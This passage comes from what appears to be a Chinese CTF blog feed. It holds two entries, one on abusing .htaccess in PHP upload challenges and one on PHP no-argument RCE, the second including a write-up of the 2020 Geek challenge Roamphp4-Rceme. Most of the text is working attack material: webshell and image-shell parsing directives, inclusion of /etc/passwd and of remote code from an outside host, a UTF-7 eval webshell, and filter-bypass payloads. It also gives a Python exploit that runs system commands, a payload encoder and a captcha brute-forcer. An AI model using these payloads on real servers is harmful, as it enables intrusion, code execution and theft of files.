href="#利用">🍭</a>利用</h2><h4 id="图片马解析"><a class="header-anchor" href="#图片马解析">🍭</a>图片马解析</h4><p>在文件上传漏洞中经常遇到上传图片马的情况，如果目标环境开启了  .htaccess 并且上传的黑名单没有限制 .htaccess 文件的话，我们可以先上传 .htaccess  文件，对目标环境的目录进行相应的配置，然后再上传图片，使图片的 PHP 恶意代码得以被直接解析执行。</p><p>常用指令：</p><blockquote><p>SetHandler 指令<br>强制将所有匹配的文件被 PHP 处理器处理并解析：</p><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-comment"># 将images.png 当做 php 执行</span></span><span class="hljs-meta">&gt;</span><span class="bash">&lt;FilesMatch <span class="hljs-string">&quot;images.png&quot;</span>&gt;</span>SetHandler application/x-httpd-php<span class="hljs-meta">&gt;</span><span class="bash">&lt;/FilesMatch&gt;</span></code></pre></blockquote><blockquote><p>AddType 指令</p><p>将给定的文件扩展名映射到 PHP 的内容类型：</p><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .jpg 当做 php 文件解析</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre></blockquote><p>这两种配置都可以使我们上传的非 PHP 类型的 Webshell 被当做 PHP 直接解析.</p><h4 id="文件包含"><a class="header-anchor" href="#文件包含">🍭</a>文件包含</h4><h5 id="本地文件包含"><a class="header-anchor" href="#本地文件包含">🍭</a>本地文件包含</h5><p>在本目录或子目录中有可解析的 PHP 文件时，可以通过 php_value 来设置 auto_prepend_file 或者 auto_append_file  配置选项来让所有的 PHP 文件自动包含一些敏感文件或恶意文件（如WebShell），来触发文件包含。</p><p>如包含 /etc/passwd：</p><blockquote><p>auto_prepend_file</p><pre><code class="hljs awk">php_value auto_prepend_file <span class="hljs-regexp">/etc/</span>passwd</code></pre></blockquote><blockquote><p>auto_append_file</p><pre><code class="hljs awk">php_value auto_append_file <span class="hljs-regexp">/etc/</span>passwd</code></pre></blockquote><p>这两个配置选项用于设置访问一个 PHP 文件时，在该 PHP 文件解析之前会先自动包含并解析的文件。如：目标环境的当前目录中存在至少一个 PHP 文件且上传黑名单没有限制 .htaccess 文件。我们也可以让 index.php 文件包含一个含有 Webshell 的文件来 Getshell，可用于图片马的解析：</p><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file images.png或:php_value <span class="hljs-built_in">auto</span>_append_file images.png</code></pre><h5 id="远程文件包含"><a class="header-anchor" href="#远程文件包含">🍭</a>远程文件包含</h5><p>PHP 的 allow_url_include默认是关闭的，如果开启的话就可以进行远程包含。因为 allow_url_include 的配置范围为  PHP_INI_SYSTEM，所以无法利用 php_flag 指令在 .htaccess 文件中开启。当 allow_url_include=On时<code>.htaccess </code>文件中的设置为：</p><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span>或:php_value <span class="hljs-built_in">auto</span>_append_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span></code></pre><p>远程主机上的phpinfo.txt就可以写一些恶意代码。</p><h4 id="任意代码执行"><a class="header-anchor" href="#任意代码执行">🍭</a>任意代码执行</h4><h5 id="通过-PHP-伪协议"><a class="header-anchor" href="#通过-PHP-伪协议">🍭</a>通过 PHP 伪协议</h5><p>利用 auto_prepend_file 或 auto_append_file 这两个配置项。条件：</p><ul><li>allow_url_fopen=On</li><li>allow_url_include=On</li><li>目标环境的当前目录中存在至少一个 PHP 文件</li></ul><pre><code class="hljs xquery">php_value auto_append_file data://<span class="hljs-type">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8+或:php_value auto_append_file data://<span class="hljs-type">text</span>/plian,<span class="hljs-meta">%3c</span><span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span><span class="hljs-meta">%3e</span>// 如果不使用base64加密则注意需要url编码</code></pre><h5 id="通过解析-htaccess-文件"><a class="header-anchor" href="#通过解析-htaccess-文件">🍭</a>通过解析 .htaccess 文件</h5><blockquote><p>通过包含 .htaccess 自身</p><pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span><span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></blockquote><blockquote><p>直接将 .htaccess 文件当做 PHP文件处理</p><p>当目标环境当前目录或子目录下没有 PHP 文件的情况下，需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则会Forbidden：</p><pre><code class="hljs gams">&gt;&lt;<span class="hljs-keyword">Files</span> ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;Require <span class="hljs-keyword">all</span> grantedOrder allow,denyAllow from <span class="hljs-keyword">all</span>&gt;&lt;/<span class="hljs-keyword">Files</span>&gt;</code></pre><p>然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：</p><pre><code class="hljs php-template"><span class="xml">&gt;SetHandler application/x-httpd-php</span><span class="xml">&gt;# </span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre><p>直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码。</p></blockquote><h4 id="进行-XSS-攻击"><a class="header-anchor" href="#进行-XSS-攻击">🍭</a>进行 XSS 攻击</h4><h5 id="通过设置-highlight-file"><a class="header-anchor" href="#通过设置-highlight-file">🍭</a>通过设置 highlight_file</h5><p>我们可以通过 .htaccess 文件设定 highlight.comment 选项，指定需要高亮的内容，从而进行 XSS。</p><p>.htaccess：</p><pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre><p>index.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">// comment</span></code></pre><p>访问index.php即可触发 XSS。</p><h5 id="通过错误消息链接"><a class="header-anchor" href="#通过错误消息链接">🍭</a>通过错误消息链接</h5><p>.htaccess ：</p><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre><p>index.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>); <span class="hljs-comment">// 这里会报错</span></code></pre><h4 id="自定义错误文件（可写Webshell）"><a class="header-anchor" href="#自定义错误文件（可写Webshell）">🍭</a>自定义错误文件（可写Webshell）</h4><p>error_log 可以将 PHP 运行报错的记录写到指定文件中，因此我们可以通过 .htaccess 文件设定 error_log 选项来自定义错误文件的存储路径，并以此来写入Webshell：</p><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.phpphp_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><span class="hljs-comment"># include_path 用来将include()的默认目录路径改变</span></code></pre><p>index.php和上面一样，访问 index.php，会报错并记录在 shell.php 文件中，但是 <code>&lt;</code> 等字符会经过 html 编码，我们需要用 UTF-7 编码格式来绕过，详见：buu 里的[XNUCA2019Qualifier]EasyPHP</p><h4 id="绕过-特殊字符"><a class="header-anchor" href="#绕过-特殊字符">🍭</a>绕过 &lt;? 特殊字符</h4><p>有时候目标环境会限制我们上传或写入的文件内容中不能存在 <code>&lt;?</code> 等特殊字符，我们同样可以使用 .htaccess 来绕过。</p><h5 id="Base64-编码绕过"><a class="header-anchor" href="#Base64-编码绕过">🍭</a>Base64 编码绕过</h5><p>利用 auto_append_file 和 PHP 伪协议，比如我们在一个图片中写入经过base64编码后的 Webshell，然后我们便可以使用 auto_append_file 配合 php://filter 将其包含进来：</p><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=images.png&quot;</span><span class="hljs-comment"># images.png 中是经过base64编码后的Webshell</span></code></pre><p>使用data://协议也可以:</p><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> auto_append_file data://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+</code></pre><h5 id="UTF-7-编码格式绕过"><a class="header-anchor" href="#UTF-7-编码格式绕过">🍭</a>UTF-7 编码格式绕过</h5><p>如我们在一个图片中写入 UTF-7 编码格式的 Webshell：</p><pre><code class="hljs swift"><span class="hljs-comment">// images.png</span>+<span class="hljs-type">ADw?</span>php eval(+<span class="hljs-type">ACQAXw</span>-<span class="hljs-type">POST</span>+<span class="hljs-type">AFs</span>-whoami+<span class="hljs-type">AF0</span>)+<span class="hljs-type">ADs?</span>+<span class="hljs-type">AD4</span>-</code></pre><ul><li>使用 auto_append_file 将其包含进来并设置编码格式为 UTF-7 ：</li></ul><pre><code class="hljs stylus">php_value auto_append_file images.pngphp_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre><ul><li>使用 php://filer 伪协议进行 UTF-7 与 UTF-8 之间的转换（UTF-16、UTF-32 也可以）：</li></ul><pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> auto<span class="hljs-number">_</span>append<span class="hljs-number">_f</span>ile <span class="hljs-string">&quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span></code></pre><ul><li>使用 .htaccess 自身包含来执行 Webshell：</li></ul><pre><code class="hljs mipsasm">php_value auto_append_file .htaccessphp_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><span class="hljs-comment"># +ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span></code></pre><h2 id="Bypass"><a class="header-anchor" href="#Bypass">🍭</a>Bypass</h2><h4 id="绕过脏字符"><a class="header-anchor" href="#绕过脏字符">🍭</a>绕过脏字符</h4><p>有的题目会在我们上传或写入的文件中加入一个混乱的字符（脏字符），由于这些字符不是 .htaccess  文件的语法或指令，会使我们的.htaccess文件不生效，出现响应500的问题。故我们要采用 <code>#</code> 对脏字符进行注释，或使用反斜杠 <code>\</code> 将换行符转义成普通字符。</p><h4 id="绕过关键字过滤"><a class="header-anchor" href="#绕过关键字过滤">🍭</a>绕过关键字过滤</h4><p>也可以使用反斜杠 <code>\</code> 加换行来实现。比如题目过滤了 type、php 等敏感字符，我们可以编辑 .htaccess：</p><pre><code class="hljs livescript">AddTy<span class="hljs-string">\</span>pe application/x-httpd-ph<span class="hljs-string">\</span>p .png<span class="hljs-comment"># 即: AddType application/x-httpd-php .png</span></code></pre><h4 id="绕过对上传图片的尺寸限制"><a class="header-anchor" href="#绕过对上传图片的尺寸限制">🍭</a>绕过对上传图片的尺寸限制</h4><p>有的题目在图片上传区会使用 <code>getimagesize()</code> 等函数对上传的图片进行尺寸限制，只允许上传指定大小尺寸的图片，并且会使用 <code>exif_imagetype()</code> 函数读取第一个字节并检查其图片类型。此时如果可以上传 .htaccess 来解析图片的话我们还需要让 .htaccess 的尺寸和经过  <code>exif_imagetype()</code>  检测。我们可以使用 <code>exif_imagetype()</code> 函数支持的 WBMP 图像类型绕过。WBMP（Wireless Bitmap）是一种移动计算机设备使用的标准图像格式，是一种纯文本二进制图像格式的图片，实例：</p><pre><code class="hljs apache"><span class="hljs-comment">#define test_width 16</span><span class="hljs-comment">#define test_height 7</span><span class="hljs-attribute">static</span> char test_bits[] = &#123;<span class="hljs-attribute">0x13</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">15</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xcd, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xc<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>,<span class="hljs-attribute">0x00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">60</span> &#125;;</code></pre><p>WBMP 图像的开头可以使用 <code>#</code> 设置图像的尺寸大小，假设题目限制我们上传的图片尺寸必须为1x1，我们在上传.htaccess时就可以用 WBMP 绕过：</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1</span>AddType application/x-httpd-php images.png</code></pre><p>实例写在另一篇文章：<a href="https://liquor-boop.github.io/2021/08/11/ffi/">buu（八)</a></p><p>参考：<a href="https://whoamianony.top/2021/04/30/Web%E5%AE%89%E5%85%A8/%E4%B8%8E%20.htaccess%20%E7%9B%B8%E5%85%B3%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">https://whoamianony.top/2021/04/30/Web安全/与 .htaccess 相关的奇淫技巧/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP无参数RCE</title>
    <link href="/2021/08/08/cmd/"/>
    <url>/2021/08/08/cmd/</url>
    
    <content type="html"><![CDATA[<p>之前无数字字母shell里只做到了<code>/[A-Za-z0-9_$]+/</code>这样的限制，但是遇到的其他题目做了很多限制，之前的绕过就行不通，比如像这样的：</p><pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/，</span></code></pre><p>就只能无参RCE了。</p><h2 id="demo"><a class="header-anchor" href="#demo">🍭</a>demo</h2><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span></code></pre><blockquote><p>(?R)引用当前表达式，?递归调用，\W匹配非单词字符</p></blockquote><p>先用工具测试一下</p><p><img src="/2021/08/08/cmd/3.png" alt="3"></p><p>满足格式，开始构造payload。</p><h2 id="payload"><a class="header-anchor" href="#payload">🍭</a>payload</h2><h5 id="getenv"><a class="header-anchor" href="#getenv">🍭</a>getenv()</h5><img src="/2021/08/08/cmd/4.png" alt="4" style="zoom: 50%;"><pre><code class="hljs lisp">var_dump(<span class="hljs-name">getenv</span>(<span class="hljs-name">phpinfo</span>()))<span class="hljs-comment">;</span></code></pre><p>getenv() 获取一个环境变量的值，phpinfo() 获取全部的环境变量，（但是直接phpinfo()好像一样）</p><p>测试一下：</p><p><img src="/2021/08/08/cmd/6.png" alt="6"></p><h5 id="getallheaders"><a class="header-anchor" href="#getallheaders">🍭</a>getallheaders()</h5><pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p>end() 将数组的内部指针移到最后一个，getallheaders() 获取所有的http请求头。</p><p>测试一下demo：</p><img src="/2021/08/08/cmd/5.png" alt="5" style="zoom:67%;"><p>但是在bp里新建一个响应头好像不行（如下面的例题），这时候可以尝试修改ua头，将end改成next；</p><h5 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">🍭</a>get_defined_vars()</h5><pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">current</span>(<span class="hljs-name">get_defined_vars</span>())))<span class="hljs-comment">;&amp;jiang=phpinfo();</span></code></pre><p><strong><code>get_defined_vars()</code><strong>返回由所有已定义变量所组成的数组，会返回</strong><code>$_GET,$_POST,$_COOKIE,$_FILES</code><strong>全局变量的值,返回数组顺序为</strong><code>get-&gt;post-&gt;cookie-&gt;files</code></strong>，<strong><code>current()</code></strong> 返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回**<code>$_GET</code>**变量的数组值。当需要的值是<code>$post</code>时把<code>current</code> 改成<code>next</code> 即可。</p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp：</p><pre><code class="hljs routeros">import requestsdef str2hex(payload):  txt = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:      txt += hex(ord(i))[-2:]  return txtpayload = str2hex(<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>)files = &#123;    payload: b<span class="hljs-string">&#x27;extrader&#x27;</span>&#125;r = requests.post(<span class="hljs-string">&quot;http://xxx/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)  # <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span> 禁用重定向处理<span class="hljs-builtin-name">print</span>(r.content.decode())</code></pre><blockquote><p>**array_rand()：<strong>从数组中随机取出一个或多个单元，如果只取出一个，</strong><code>array_rand()</code>**返回随机单元的键名。 否则就返回包含随机键名的数组</p></blockquote><h5 id="session-start"><a class="header-anchor" href="#session-start">🍭</a>session_start()</h5><pre><code class="hljs reasonml">show<span class="hljs-constructor">_source(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>)))highlight<span class="hljs-constructor">_file(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));readfile(session<span class="hljs-constructor">_id(<span class="hljs-params">session_start</span>()</span>)); 或者readgzfile<span class="hljs-literal">()</span>;#修改cookie : PHPSESSID= filename</code></pre><p>or</p><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(hex2bin(session_id(session_start())))<span class="hljs-comment">;</span><span class="hljs-meta">#抓包传入Cookie: PHPSESSID=(<span class="hljs-string">&quot;system(&#x27;命令&#x27;)&quot;</span>的十六进制)</span></code></pre><p>测试：<img src="/2021/08/08/cmd/9.png" alt="9"></p><h5 id="scandir"><a class="header-anchor" href="#scandir">🍭</a>scandir()</h5><p>读取文件</p><pre><code class="hljs reasonml">当前目录：highlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));上级目录文件：highlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">chdir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">getcwd</span>()</span>)))))));#随机获取</code></pre><p>可以配合 数组的指针，倒序，等各种方式找到我们需要的文件：</p><ul><li><p><strong>getchwd()</strong> ：函数返回当前工作目录。</p></li><li><p><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</p></li><li><p><strong>dirname()</strong> ：函数返回路径中的目录部分。</p></li><li><p><strong>chdir()</strong> ：函数改变当前的目录。</p></li><li><p><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</p></li><li><p><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</p></li></ul><blockquote><p>array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</p></blockquote><blockquote><p>dirname(chdir(dirname()))配合切换文件路径</p></blockquote><blockquote><p>current(localeconv())：</p><blockquote><p>localeconv()：返回一包含本地数字及货币格式信息的数组,数组第一项就是小数点字符(过滤该字符时可用)</p></blockquote></blockquote><p>还有一系列函数：<strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整。可以组合使用：</p><ul><li><code>phpversion()</code></li><li><code>floor(phpversion())</code></li><li><code>sqrt(floor(phpversion()))</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><h5 id="数组操作"><a class="header-anchor" href="#数组操作">🍭</a>数组操作</h5><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h2 id="极客大挑战-2020-Roamphp4-Rceme"><a class="header-anchor" href="#极客大挑战-2020-Roamphp4-Rceme">🍭</a>[极客大挑战 2020]Roamphp4-Rceme</h2><p>在控制台里看到提示</p><img src="/2021/08/08/cmd/1.png" alt="1" style="zoom:67%;"><p>.index.php.swp 可以获取源码：</p><p><img src="/2021/08/08/cmd/2.png" alt="2"></p><p>有乱码，用vim恢复：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(substr(md5($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);    &#125;    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);    $code = $_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>];    <span class="hljs-keyword">if</span>(strlen($code) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $code))&#123;        @<span class="hljs-keyword">eval</span>($code);        <span class="hljs-keyword">die</span>();    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>字符长度有限制，过滤很多符号</p><pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/，</span></code></pre><p>过滤了 异或 ，或；取反还在，只能无参RCE了,测试一下：</p><img src="/2021/08/08/cmd/10.png" alt="10" style="zoom: 67%;"><p>符合，用脚本生成</p><pre><code class="hljs livecodeserver">def <span class="hljs-literal">one</span>(s):    ss = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> s:        ss += <span class="hljs-string">&quot;%&quot;</span> + str(hex(<span class="hljs-number">255</span> - ord(<span class="hljs-keyword">each</span>)))[<span class="hljs-number">2</span>:].<span class="hljs-built_in">upper</span>()    <span class="hljs-literal">return</span> f<span class="hljs-string">&quot;[~&#123;ss&#125;][!%FF](&quot;</span><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    <span class="hljs-keyword">a</span> = input(<span class="hljs-string">&quot;:&gt;&quot;</span>).strip(<span class="hljs-string">&quot;)&quot;</span>)    aa = <span class="hljs-keyword">a</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;(&quot;</span>)    s = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> aa[:<span class="hljs-number">-1</span>]:        s += <span class="hljs-literal">one</span>(<span class="hljs-keyword">each</span>)    s += <span class="hljs-string">&quot;)&quot;</span> * (<span class="hljs-built_in">len</span>(aa) - <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;;&quot;</span>    print(s)</code></pre><p>payload</p><pre><code class="hljs lisp">system(<span class="hljs-name">next</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p>题目传cmd同时会随机对code做出限制</p><pre><code class="hljs apache"><span class="hljs-attribute">if</span>:substr(md<span class="hljs-number">5</span>($code),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)==<span class="hljs-number">69622</span></code></pre><p>值每次不同，需要爆破</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">9999999</span>):</span><span class="hljs-function">    <span class="hljs-variable">md5_ins</span> = <span class="hljs-variable">hashlib.md5</span>((<span class="hljs-title">str</span>(<span class="hljs-variable">i</span>)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span>    <span class="hljs-variable">a</span>=<span class="hljs-variable">md5_ins.hexdigest</span>()    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>[:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;69622&quot;</span>:        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span>        <span class="hljs-variable">break</span></code></pre><p>编码，抓包，执行</p><img src="/2021/08/08/cmd/8.png" alt="8"><p>读取</p><p><img src="/2021/08/08/cmd/7.png" alt="7"></p><p>参考：<a href="https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme">https://github.com/WAY29/geek-2020-challenges/tree/main/roamphp4-rceme</a></p>]]></content>
    
    
    <categories>
      
      <category>无参RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（七）</title>
